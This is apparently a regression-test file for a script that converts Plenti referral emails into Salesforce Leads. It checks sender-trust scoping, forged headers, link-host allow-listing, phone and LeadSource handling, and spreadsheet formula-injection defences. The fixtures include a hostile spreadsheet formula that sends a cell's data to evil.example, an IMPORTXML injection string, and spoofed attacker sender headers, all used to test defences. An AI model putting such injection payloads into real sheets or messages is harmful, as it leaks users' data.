 plAssertEq_(forwarded.leadCandidate,true,'a forwarded referral is still labelled');
 plAssertEq_(forwarded.scope,'forwarded','but categorised separately');
 plAssert_(/FORWARDED BY A COLLEAGUE/.test(forwarded.reason),'the reason names the category');
 plAssert_(/lily@example\.org/.test(forwarded.reason),'and names who forwarded it');
 plAssert_(/From can be forged/.test(forwarded.reason),
  'and warns that From is attacker-controllable — this wording is a hint, never a verdict');
 plAssert_(!/NEEDS A HUMAN/.test(forwarded.reason),'it is not presented as a suspected spoof');

 // ⚠️ 安全性:伪造 From 只能改措辞,**不能**降低可见性
 var spoofedFrom=run(make({id:'scope-spoofed-from',subject:'Fwd: Action required: New lead',
  from:'Lily <lily@example.org>',
  headers:{'To':'Jack <jack@example.org>','X-Original-Sender':'attacker@evil.example',
   'X-Original-Authentication-Results':'mx; dmarc=fail header.from=evil.example'},
  body:'View in Browser: '+link+'\n'}));
 plAssertEq_(spoofedFrom.leadCandidate,true,'forging From must NOT suppress the label');
 plAssertEq_(ivLeadLabelFlags_([spoofedFrom]).review,true,'the label still lights');
 plAssert_(spoofedFrom.scope!=='forwarded','and with X-Original-Sender present it is NOT presented as a colleague forward (R18)');

 // ---- 3b. [R18] 真实组投递:From 被改写成组地址 ----
 //      第一封真实组投递邮件证实:发件域 DMARC p=REJECT 时,Google Groups 把 From
 //      改写成组地址,而组地址在内部域上。旧判据会把它误判成"同事转发"。
 var viaGroup=run(make({id:'scope-via-group',subject:'Scheme update',
  from:'"\'Plenti Scheme\' via Group" <edocs@example.org>',
  // 发件人刻意选在可信清单**之外**:测试基线信任整个 @plenti.example 域,
  // 用 @plenti.example 的地址会直接通过可信验证并建出 Lead(见 D-030 的情况 C)。
  headers:{'To':'eDocs <edocs@example.org>','X-Original-Sender':'scheme@schemes.example',
   'X-Original-Authentication-Results':'mx; dkim=pass; dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=schemes.example',
   'List-ID':'<edocs.example.org>'},
  body:'View in Browser: '+link+'\n'}));
 plAssert_(viaGroup.scope!=='forwarded','a group-delivered message whose From was rewritten to the group address must NOT be called a colleague forward');
 plAssertEq_(viaGroup.scope,'unlisted-sender-with-link','it came through the group from a sender outside the trusted list');
 plAssert_(/scheme@schemes\.example/.test(viaGroup.reason),'and the reason tells you exactly which address to add if it is legitimate');
 plAssert_(!/FORWARDED BY A COLLEAGUE/.test(viaGroup.reason),'the reason must not claim the group headers are missing — they are present');
 plAssertEq_(viaGroup.leadCandidate,true,'still labelled: it carries a Plenti link');

 // ---- 4. 判据只看链接存在,绝不发起抓取 ----
 plTestClearState_();
 plTestWithFetch_(function(){throw new Error('must not fetch a page for unverified mail');},function(fetched){
  plTestWithFakeApi_(function(){
   plProcess_(make({id:'scope-nofetch',from:'X <x@elsewhere.example>',
    headers:{'To':'eDocs <edocs@example.org>'},body:'View in Browser: '+link+'\n'}),false);
  });
  plAssertEq_(fetched.length,0,'presence check only — never fetch a URL from an unverified message');
 });

 // ---- 5. 单元级:plUnverifiedReview_ 三个分支 ----
 var base='base reason';
 var a=plUnverifiedReview_(make({id:'u1'}),base);
 plAssertEq_(a.leadCandidate,false,'no link → no label');
 plAssert_(a.reason.indexOf(base)>=0,'the underlying reason is preserved, not replaced');
 var b=plUnverifiedReview_(make({id:'u2',body:'x '+link}),base);
 plAssertEq_(b.leadCandidate,true,'link → label');
 var cInternal=plUnverifiedReview_(make({id:'u3',from:'Someone <someone@example.org>',body:'x '+link}),base);
 plAssertEq_(cInternal.scope,'forwarded','internal From → forwarded category');
 // 域名边界:近似域名不算内部
 var lookalike=plUnverifiedReview_(make({id:'u4',from:'X <x@notexample.org>',body:'x '+link}),base);
 plAssertEq_(lookalike.scope,'unverified-with-link','a look-alike domain is not treated as an internal forward');

 plTestClearState_();
 plTestBaseline_();
 console.log('PASS: 33 scope-narrowing cases (label reserved for Plenti-linked mail; forward / unlisted / auth-failed told apart)');
}

// ============================================================
// 27. R17 两个数据源、Customer phone、LeadSource 读属性(D-029)
// ============================================================

function testPlentiTwoSources(){
 plTestBaseline_();
 var page=plTestBrowserHtml_(),token=plTestBrowserToken_();
 var withTemplate=plTestMessage_('trusted-referral-with-template');
 var linkOnly=plTestMessage_('trusted-referral-with-link');

 function enrich(message,handler){
  return plTestWithFetch_(handler,function(){
   var parsed=parsePlentiReferral_(message),r=plEnrichFromBrowserView_(message,parsed);
   return {parsed:parsed,meta:parsed.browserView,html:r.html};
  });
 }
 var ok=function(){return {code:200,text:page};};
 var fail=function(){return null;};

 // ---- 1. 两边一致 → 来源记 both,不报冲突 ----
 var both=enrich(withTemplate,ok);
 plAssertEq_(both.parsed.customer.lastName,'Fixture Example','name parsed');
 plAssertEq_(both.meta.sources.name,'both','identical in both sources → recorded as both');
 plAssertEq_(both.meta.sources.phone,'both','phone agrees too');
 plAssertEq_(both.meta.conflicts.length,0,'no conflict');
 plAssertEq_(both.meta.emailFound.length,4,'the email HTML is parsed with the same template parser');
 plAssertEq_(both.meta.pageFound.length,4,'and so is the page');
 plAssertEq_(both.html,page,'the page is still fetched and kept for audit even though the email was complete');

 // ---- 2. 邮件是空的(只有链接)、页面有数据 → 页面补齐 ----
 //     这正是 Gabby TEST 那一类:邮件里没数据,页面上有。
 var fill=enrich(linkOnly,ok);
 plAssertEq_(fill.parsed.customer.lastName,'Fixture Example','the page fills a field the email lacks');
 plAssertEq_(fill.meta.sources.name,'page','and the source says so');
 plAssertEq_(fill.meta.emailFound.length,0,'the email contributed nothing');

 // ---- 3. 页面抓不到、邮件有数据 → 数据完整,只丢审计留底 ----
 //     以前抓取失败 = 没数据;现在两根轴分开了,这是温和得多的降级。
 var auditOnly=enrich(withTemplate,fail);
 plAssertEq_(auditOnly.parsed.customer.lastName,'Fixture Example','customer data survives a failed fetch when the email carries it');
 plAssertEq_(auditOnly.parsed.confidence,'high','so confidence stays high');
 plAssertEq_(auditOnly.meta.degraded,false,'the DATA is not degraded');
 plAssertEq_(auditOnly.meta.auditMissing,true,'only the audit copy is missing');
 plAssertEq_(auditOnly.html,'','no page to store');
 plAssert_(/audit copy is missing/.test(auditOnly.parsed.reason),'the reason distinguishes this from missing data');
 plAssert_(/customer data came from the email/.test(auditOnly.parsed.reason),'and says where the data came from');

 // ---- 4. 两边都没有 → 数据降级 ----
 var neither=enrich(linkOnly,fail);
 plAssertEq_(neither.meta.degraded,true,'no name from either source is real data degradation');
 plAssertEq_(neither.meta.auditMissing,true,'and the audit copy is missing too');
 plAssertEq_(neither.parsed.kind,'referral','identity still comes from the token — the Lead is still created');
 plAssertEq_(neither.parsed.referralId,token,'token preserved');

 // ---- 5. 冲突 → 以邮件为准,记下来,不阻断 ----
 var conflictPage=page.replace('0400 000 111','0400 000 999');
 var conflict=enrich(withTemplate,function(){return {code:200,text:conflictPage};});
 plAssertEq_(conflict.parsed.customer.phone,'0400 000 111','on conflict the EMAIL value wins — it is what we actually received');
 plAssertEq_(conflict.meta.sources.phone,'email','and the source records it');
 plAssertEq_(conflict.meta.conflicts.join(','),'phone','the conflict is recorded');
 plAssert_(/DISAGREE on: phone/.test(conflict.parsed.reason),'and surfaced in the reason');
 plAssertEq_(conflict.parsed.kind,'referral','a conflict does not block creation — the SLA clock is running');
 // 同一个号码换个格式不算冲突
 var formatPage=page.replace('0400 000 111','+61 400 000 111');
 var sameNumber=enrich(withTemplate,function(){return {code:200,text:formatPage};});
 plAssertEq_(sameNumber.meta.conflicts.length,0,'+61 400 000 111 and 0400 000 111 are the same number, not a conflict');

 // ---- 6. Description 的三种标记相互独立 ----
 var msg=plTestMessage_('trusted-referral');
 function descOf(meta){var p=plTestParsed_();return plLeadPayload_(msg,p,{html:'',meta:meta}).Description;}
 plAssert_(/CUSTOMER DETAILS MISSING/.test(descOf({found:[],degraded:true,auditMissing:true})),'data missing');
 plAssert_(!/AUDIT COPY MISSING/.test(descOf({found:[],degraded:true,auditMissing:true})),'data-missing already implies it, so the audit flag is not repeated');
 plAssert_(/AUDIT COPY MISSING/.test(descOf({found:['name'],degraded:false,auditMissing:true})),'audit-only missing gets its own milder flag');
 plAssert_(!/CUSTOMER DETAILS MISSING/.test(descOf({found:['name'],degraded:false,auditMissing:true})),'and is not mislabelled as missing data');
 plAssert_(/SOURCES DISAGREE: phone/.test(descOf({found:['name'],conflicts:['phone']})),'a conflict is flagged in Description for the follow-up person');
 var clean=descOf({found:['name']});
 plAssert_(!/CUSTOMER DETAILS MISSING|SOURCES DISAGREE|AUDIT COPY MISSING/.test(clean),'a clean Lead carries none of the three flags');
 plAssert_(clean.indexOf('[Intake: ')===0,'but still starts with the load-bearing marker (D-013)');

 // ---- 7. 电话:手机进 MobilePhone、座机进 Phone,原样写入 ----
 function phonePayload(phone){var p=plTestParsed_();p.customer.phone=phone;return plLeadPayload_(msg,p,{html:'',meta:{found:[]}});}
 var mobile=phonePayload('0400000111');
 plAssertEq_(mobile.MobilePhone,'0400000111','an 04 number goes to MobilePhone');
 plAssert_(!('Phone' in mobile),'and not to Phone');
 var intl=phonePayload('+61 400 000 111');
 plAssertEq_(intl.MobilePhone,'+61 400 000 111','a +61 4 number is a mobile too, and is stored verbatim — no normalisation');
 var landline=phonePayload('08 8000 0000');
 plAssertEq_(landline.Phone,'08 8000 0000','a landline goes to Phone, verbatim');
 plAssert_(!('MobilePhone' in landline),'and not to MobilePhone');
 var none=phonePayload('');
 plAssert_(!('Phone' in none)&&!('MobilePhone' in none),'no phone means neither field is written');

 // ---- 8. ⚠️ D-024 修正:我们自己写的电话不能让 review 解除 ----
 var parsedWithPhone=plTestParsed_();parsedWithPhone.customer.phone='0400000111';
 var supplied=plSuppliedContacts_(parsedWithPhone);
 plAssert_(supplied.MobilePhone,'the supplied phone is recorded against the field it was written to');
 plAssert_(supplied.MobilePhone.indexOf('0400')<0,'as a fingerprint, not the number itself — no plaintext phone in Script Properties');
 var ours={Id:'00Q1',Email:null,Phone:null,MobilePhone:'0400000111',Status:'New',IsConverted:false};
 plAssertEq_(plReviewClearedReason_(ours,supplied),'','our own phone is NOT evidence a person acted — the review stays open');
 var reformatted={Id:'00Q1',Email:null,Phone:null,MobilePhone:'0400 000 111',Status:'New',IsConverted:false};
 plAssertEq_(plReviewClearedReason_(reformatted,supplied),'','nor is the same number in a different format');
 var changed={Id:'00Q1',Email:null,Phone:null,MobilePhone:'0400000999',Status:'New',IsConverted:false};
 plAssert_(/changed by a person \(MobilePhone\)/.test(plReviewClearedReason_(changed,supplied)),'a person changing the phone DOES clear it');
 var emailAdded={Id:'00Q1',Email:'c@example.net',Phone:null,MobilePhone:'0400000111',Status:'New',IsConverted:false};
 plAssert_(/\(Email\)/.test(plReviewClearedReason_(emailAdded,supplied)),'a person adding the email clears it');
 plAssert_(/Contact details were added/.test(plReviewClearedReason_({Id:'00Q1',MobilePhone:'0400000111'},{})),
  'with nothing recorded as supplied, the old behaviour is preserved');

 // ---- 9. LeadSource 从属性读,且在上锁之前校验 ----
 plAssertEq_(plLeadSource_(),'Plenti Referrals','read from PLENTI_LEAD_SOURCE');
 plTestSetProps_({PLENTI_LEAD_SOURCE:null});
 plAssertThrows_(function(){plLeadSource_();},/PLENTI_LEAD_SOURCE/,'missing configuration stops processing');
 plTestSetProps_({PLENTI_LEAD_SOURCE:'Plenti Referrals'});

 // 值不在 picklist 里 → 在写 IV2_CREATE_ 锁**之前**就抛
 plTestClearState_();
 (function(){
  var real=ivReq_,p=PropertiesService.getScriptProperties();
  plLeadFieldMap_.cache=null;
  ivReq_=function(path){
   if(path==='sobjects/Lead/describe')return {fields:[{name:'LeadSource',createable:true,
    picklistValues:[{value:'Web',active:true},{value:'Plenti',active:true},{value:'Old Value',active:false}]}]};
   throw new Error('must not POST with an invalid LeadSource');
  };
  try{
   plAssertThrows_(function(){plCreateLead_(msg,plTestParsed_(),{html:'',meta:{found:[]}});},
    /not an active LeadSource picklist value/,'an invalid LeadSource is refused');
   plAssertEq_(p.getProperty('IV2_CREATE_'+msg.getId()),null,
    'and the IV2_CREATE_ lock was never written — a config error must not strand a message behind L-01');
   plTestSetProps_({PLENTI_LEAD_SOURCE:'Old Value'});
   plAssertThrows_(function(){plValidatedLeadSource_();},/not an active/,'an INACTIVE picklist value is refused too');
  }finally{ivReq_=real;plLeadFieldMap_.cache=null;plTestSetProps_({PLENTI_LEAD_SOURCE:'Plenti Referrals'});}
 })();
 // describe 失败时不阻断(与可选字段探测同一策略)
 plLeadFieldMap_.cache=null;
 plAssertEq_(plValidatedLeadSource_(),'Plenti Referrals','with no picklist information the value is used as configured');

 // ---- 10. 自检把 LeadSource 的有效性报出来,且不会因为配错而自己崩掉 ----
 var names=[],used=plLeadFieldsUsed_(),i;
 for(i=0;i<used.length;i++)names.push(used[i].name);
 (function(){
  var real=ivReq_,logged=[];
  var realLog=console.log;
  plLeadFieldMap_.cache=null;
  ivReq_=function(){
   var out=[],j;
   for(j=0;j<names.length;j++){
    if(names[j]==='LeadSource')out.push({name:'LeadSource',createable:true,picklistValues:[{value:'Web',active:true}]});
    else out.push({name:names[j],createable:true});
   }
   return {fields:out};
  };
  console.log=function(m){logged.push(String(m));};
  try{
   var report=plTestDescribeLead();
   plAssert_(report,'the self-check completes even when LeadSource is misconfigured — it must report the problem, not crash on it');
   plAssert_(logged.some(function(l){return /PLENTI_LEAD_SOURCE="Plenti Referrals" is NOT an active LeadSource value/.test(l);}),
    'and names the misconfiguration explicitly');
  }finally{ivReq_=real;console.log=realLog;plLeadFieldMap_.cache=null;}
 })();

 plTestClearState_();
 plTestBaseline_();
 console.log('PASS: 52 two-source / phone / LeadSource cases');
}

// ============================================================
// 28. D-031 链接主机:只认 e.customeriomail.com,绝不碰跟踪域名
// ============================================================

function testPlentiLinkHost(){
 plTestBaseline_();
 var real=plTestMessage_('trusted-referral-real-shape'),tok=plFixtures_()['trusted-referral-real-shape'].token;
 var direct='https://e.customeriomail.com/deliveries/'+tok;

 // ---- 1. 真实形态:纯文本是跟踪域名,HTML 是直达 → 必须拿到直达那个 ----
 plAssertEq_(plBrowserViewUrl_(real),direct,'the direct e.customeriomail.com link is chosen, never the tracking one');
 plAssertEq_(plDeliveryToken_(plBrowserViewUrl_(real)),tok,'the token survives intact, including its "-"');

 // ---- 2. 只有跟踪域名的形态 → 必须跳过,宁可拿不到 token ----
 var trackedOnly=plTestMessageFrom_({id:'tracked-only',subject:'s',headers:{},
  body:'View in Browser ( https://track.customer.io/deliveries/'+tok+' )',html:''});
 plAssertEq_(plBrowserViewUrl_(trackedOnly),'','a track.customer.io link must be skipped — fetching it would register a fake customer click in Plenti\'s Customer.io');

 // ---- 3. 域名边界与协议 ----
 function urlOf(u){return plBrowserViewUrl_(plTestMessageFrom_({id:'u',subject:'s',headers:{},body:u,html:''}));}
 plAssertEq_(urlOf('https://evilcustomeriomail.com/deliveries/AB=='),'','no domain-boundary bypass (the same bug class D-009 fixed for senders)');
 plAssertEq_(urlOf('https://track.customeriomail.com/deliveries/AB=='),'','other subdomains are not accepted');
 plAssertEq_(urlOf('https://e.customeriomail.com.attacker.example/deliveries/AB=='),'','the real host used as a prefix is not accepted');
 plAssertEq_(urlOf('http://e.customeriomail.com/deliveries/AB=='),'','plain http is not accepted');
 plAssertEq_(urlOf('https://e.customeriomail.com/deliveries/AB-c_d=='),'https://e.customeriomail.com/deliveries/AB-c_d==','the exact host over https is accepted');

 // ---- 4. 抓取:只打直达链接,不跟随跳转 ----
 plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(fetched){
  var parsed=parsePlentiReferral_(real);
  plEnrichFromBrowserView_(real,parsed);
  plAssertEq_(fetched.length,1,'exactly one request');
  plAssertEq_(fetched[0].url,direct,'the request goes to the direct link');
  plAssert_(fetched[0].url.indexOf('track.customer.io')<0,'and never to the tracking host');
  plAssertEq_(fetched[0].options.followRedirects,false,'redirects are not followed — a 3xx must not smuggle the request onto a tracking host');
 });

 // ---- 5. 直达链接若开始 3xx → 当作抓取失败,Lead 照建(数据从邮件来)----
 plTestWithFetch_(function(){return {code:302,text:''};},function(){
  var parsed=parsePlentiReferral_(real);
  plEnrichFromBrowserView_(real,parsed);
  plAssertEq_(parsed.browserView.auditMissing,true,'a redirect counts as a failed fetch');
  plAssert_(/redirect not followed/.test(parsed.browserView.error),'and says why');
  plAssertEq_(parsed.kind,'referral','identity still comes from the token');
  plAssertEq_(parsed.customer.lastName,'Fixture Example','and customer data still comes from the email body (D-029)');
  plAssertEq_(parsed.browserView.degraded,false,'so the data is not degraded — only the audit copy is missing');
 });

 plTestBaseline_();
 console.log('PASS: 16 link-host cases (direct link only; tracking host never fetched; redirects not followed)');
}

// ============================================================
// 入口
// ============================================================

// ============================================================
// 28. [Q17] out-of-scope 状态最小落盘 + 窗口外清理判定(D-032)
//     主循环接线(thread 带回旧邮件、冻结 watermark)在 test/offline.cjs 第 10 节。
// ============================================================

function testPlentiOutOfScopeState(){
 plTestBaseline_();
 var p=PropertiesService.getScriptProperties();
 var link='https://e.customeriomail.com/deliveries/'+plTestBrowserToken_();
 function make(id,body){
  return plTestMessageFrom_({id:id,subject:'Invoice for August',date:'2026-09-10T02:00:00.000Z',
   from:'Someone <someone@elsewhere.example>',
   headers:{'To':'eDocs <edocs@example.org>','X-Original-Sender':'accounts@supplier.example',
    'X-Original-Authentication-Results':'mx; dmarc=pass header.from=supplier.example'},
   body:body});
 }

 // ---- 第 2 步:落盘最小,返回完整 ----
 plTestClearState_();
 var message=make('q17-noise','Just an ordinary business email.\n');
 var returned=plTestWithFakeApi_(function(){return plProcess_(message,false);});
 plAssertEq_(returned.scope,'out-of-scope','fixture is out of scope');
 plAssert_(String(returned.reason).length>200,'the caller still gets the full reason for the Messages log');
 var raw=p.getProperty('IV2_MSG_q17-noise'),stored=JSON.parse(raw);
 // 以前约 454 字节。80 是上界不是目标:实际 72 左右,留一点余量给 state 取值变化。
 plAssert_(raw.length<=80,'the persisted out-of-scope state must stay minimal, got '+raw.length+' bytes: '+raw);
 plAssertEq_(Object.keys(stored).sort().join(','),'date,scope,state','only state, scope and date are persisted');
 plAssertEq_(stored.date,'2026-09-10T02:00:00.000Z','date is the message date — the purge aligns to it');
 plAssert_(stored.state!=='error','must never be error — the idempotency short-circuit depends on it');
 plAssertEq_(ivLeadLabelFlags_([stored]).review,false,'the stored minimal state lights no Review label');
 plAssertEq_(ivLeadLabelFlags_([stored]).created,false,'nor a Created label');
 plTestWithFakeApi_(function(calls){
  var again=plProcess_(message,false);
  plAssertEq_(calls.length,0,'a second run performs no calls');
  plAssertEq_(again.scope,'out-of-scope','and returns the stored minimal state');
 });

 // 带链接的几类照旧完整落盘:量极少,而且标签靠 leadCandidate
 plTestClearState_();
 plTestWithFakeApi_(function(){plProcess_(make('q17-with-link','View in Browser: '+link+'\n'),false);});
 var linked=JSON.parse(p.getProperty('IV2_MSG_q17-with-link'));
 plAssertEq_(linked.leadCandidate,true,'a with-link state keeps leadCandidate');
 plAssert_(linked.reason&&linked.reason.length>50,'and keeps its full reason');

 // ---- 第 3 步:哪些能删 ----
 var lower=new Date('2026-09-08T00:00:00Z').getTime(),old='2026-09-07T01:00:00.000Z';
 var cases=[
  [{state:'review',scope:'out-of-scope',date:old},true,'minimal out-of-scope outside the window'],
  [{state:'review',kind:'review',scope:'out-of-scope',leadCandidate:false,reason:'Out of scope: fictional',date:old,at:old},true,
   'a pre-Q17 full-size out-of-scope state outside the window'],
  [{state:'review',scope:'out-of-scope',date:'2026-09-08T12:00:00.000Z'},false,'inside the window'],
  [{state:'review',scope:'out-of-scope',date:'2026-09-08T00:00:00.000Z'},false,'exactly at lower is still inside — same comparison as the main loop'],
  [{state:'error',scope:'out-of-scope',date:old},false,'error is never purged'],
  [{state:'done',scope:'out-of-scope',record:'00Qq17000000001AAA',date:old},false,'a state with a record is never purged'],
  [{state:'done',scope:'out-of-scope',created:true,date:old},false,'a created state is never purged'],
  [{state:'review',scope:'out-of-scope',leadCandidate:true,date:old},false,'a lead candidate is never purged'],
  [{state:'review',scope:'unlisted-sender-with-link',leadCandidate:true,date:old},false,'with-link scopes are never purged'],
  [{state:'done',kind:'internal',reason:'Internal sender',date:old},false,'other done states are outside the authorised scope (Q19)'],
  [{state:'review',scope:'out-of-scope',date:null},false,'a null date must not turn into 1970 and get purged'],
  [{state:'review',scope:'out-of-scope'},false,'a missing date is not purged'],
  [{state:'review',scope:'out-of-scope',date:'not-a-date'},false,'an unparsable date is not purged'],
  [null,false,'null']
 ];
 cases.forEach(function(c){plAssertEq_(ivPurgeable_(c[0],lower),c[1],c[2]);});
 plTestClearState_();
}

// ============================================================
// 29. [Q18] review = "脚本需要人帮忙";Messages 行的超链接与公式注入防护(D-033)
// ============================================================

function testPlentiReviewMeansHelpNeeded(){
 plTestBaseline_();

 // ---- 1. 例外清单:只有这几类落 review ----
 var clean={confidence:'high',browserView:{conflicts:[]}};
 plAssertEq_(plCreatedExceptions_(clean,false,true).length,0,'a clean create has no exceptions');
 plAssert_(/\[DEGRADED\]/.test(plCreatedExceptions_({confidence:'low',browserView:{conflicts:[]}},false,true).join(' ')),'degraded');
 plAssert_(/\[SOURCES DISAGREE: address\]/.test(plCreatedExceptions_({confidence:'high',browserView:{conflicts:['address']}},false,true).join(' ')),'source conflict');
 plAssert_(/\[FORCED\]/.test(plCreatedExceptions_(clean,true,true).join(' ')),'forced create');
 plAssert_(/\[RESENT/.test(plCreatedExceptions_(clean,false,false).join(' ')),
  'a resent referral (Lead created from another message) still raises Review — D-026, unchanged by Q18');
 plAssertEq_(plCreatedExceptions_({confidence:'high',browserView:{conflicts:[],auditMissing:true}},false,true).length,0,
  'a missing audit copy alone is not in the approved exception list');
 plAssertEq_(plCreatedExceptions_({confidence:'high'},false,true).length,0,'no browserView meta (forced parse) does not crash');

 // ---- 2. 端到端:重发件 → review;干净的 done 不会触发任何轮询 ----
 plTestClearState_();
 plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(){
  var linked=plTestMessage_('trusted-referral-with-link');
  plTestWithFakeApi_(function(calls){
   ivQuery_=function(q){calls.push({kind:'query',query:q});
    return [{Id:'00Qq18000000001AAA',Description:'[Intake: some-other-message] fictional',IsConverted:false,Status:'New'}];};
   var st=plProcess_(linked,false);
   plAssertEq_(st.created,false,'the token hit a Lead created from another message');
   plAssertEq_(st.state,'review','a resend is an exception');
   plAssert_(/\[RESENT/.test(st.reason)&&/needs a human/.test(st.reason),'and the reason says why a human is needed: '+st.reason);
  });
 });
 plTestClearState_();
 var doneState={state:'done',kind:'referral',created:true,record:'00Qq18000000002AAA',leadCandidate:true,date:'2026-09-10T02:00:00.000Z'};
 ivSave_('q18-clean',doneState);
 plTestWithFakeApi_(function(calls){
  plAssertEq_(plRefreshReview_(plTestMessageFrom_({id:'q18-clean'})),false,'a done Lead is not polled');
  plAssertEq_(calls.length,0,'no SOQL is spent on clean Leads — polling covers exceptions only');
 });

 // ---- 3. Messages 行 ----
 var realToken=ivReq_.token;
 try{
  ivReq_.token={access_token:'fixture',instance_url:'https://fixture.my.salesforce.example'};
  var hostile=plTestMessageFrom_({id:'q18-row',subject:'=IMAGE("https://evil.example/?"&L2)',
   body:'+61 fictional body that starts with a plus\n',date:'2026-09-10T02:00:00.000Z'});
  var row=ivMessageLogRow_(hostile,'edocs@example.org',doneState,{sender:'@fictional.example'});
  plAssertEq_(row[9],'=HYPERLINK("https://fixture.my.salesforce.example/lightning/r/Lead/00Qq18000000002AAA/view","00Qq18000000002AAA")',
   'the SF Lead ID becomes a link, generated once at write time');
  plAssertEq_(row[6],'created','a clean created Lead shows as created');
  plAssertEq_(row[5].charAt(0),"'",'a subject starting with = is forced to text — never executed as a formula');
  plAssertEq_(row[11].charAt(0),"'",'so is a body starting with +');
  plAssertEq_(row[3].charAt(0),"'",'and a sender starting with @');
  var formulas=row.filter(function(v){return /^[=+\-@]/.test(String(v));});
  plAssertEq_(formulas.length,1,'the Lead link is the ONLY formula in the row');

  var reviewRow=ivMessageLogRow_(hostile,'edocs@example.org',
   {state:'review',created:true,record:'00Qq18000000003AAA',reason:'[DEGRADED] New Plenti Lead created — needs a human',date:'2026-09-10T02:00:00.000Z'},{});
  plAssertEq_(reviewRow[6],'created + review','a created Lead that needs a human must be distinguishable from a clean one');

  var outRow=ivMessageLogRow_(hostile,'edocs@example.org',
   {state:'done',scope:'out-of-scope',reason:'Out of scope: fictional reason',date:'2026-09-10T02:00:00.000Z'},{});
  plAssert_(/Out of scope: fictional reason/.test(outRow[10]),'a done row still carries its reason in the notes column');

  plAssert_(!/^=/.test(ivLeadCell_('00Q"),IMPORTXML("x')),'a malformed id never becomes a HYPERLINK formula');
  plAssertEq_(ivLeadCell_('=1+1'),"'=1+1",'and a malformed value starting with = is forced to text');
  plAssertEq_(ivLeadCell_(''),'','no record, empty cell');
  ivReq_.token={access_token:'fixture',instance_url:'https://bad".example'};
  plAssertEq_(ivLeadCell_('00Qq18000000002AAA'),'00Qq18000000002AAA','a suspicious instance URL falls back to the plain id');
  ivReq_.token=null;
  plAssertEq_(ivLeadCell_('00Qq18000000002AAA'),'00Qq18000000002AAA','no Salesforce call this run → plain id, no crash');
 }finally{ivReq_.token=realToken;}
 plTestClearState_();
}

function runPlentiRegressionTests(){
 testPlentiReviewMeansHelpNeeded();
 testPlentiOutOfScopeState();
 testPlentiLinkHost();
 testPlentiTwoSources();
 testPlentiScopeNarrowing();
 testPlentiCreatedDurability();
 testPlentiSystemsVisible();
 testPlentiReceivedAt();
 testPlentiFieldSelfCheck();
 testPlentiSenderOverride();
 testPlentiTestEntryPoint();
 testPlentiBrowserView();
 testPlentiMessageBody();
 testPlentiForceCreate();
 testPlentiRecipientAllowlist();
 testPlentiSourceTrust();
 testPlentiTrustedSenderBoundary();
 testPlentiExclusions();
 testPlentiEmptySenderNeverInternal();
 testPlentiUntrustedReason();
 testPlentiParserSkeleton();
 testPlentiReferralLookupFailClosed();
 testPlentiDeduplicationLayers();
 testPlentiCreateLock();
 testPlentiLeadPayload();
 testPlentiRawEmailDefaultOff();
 testPlentiRequiredProperties();
 testPlentiProcessFlow();
 testPlentiReviewRelease();
}
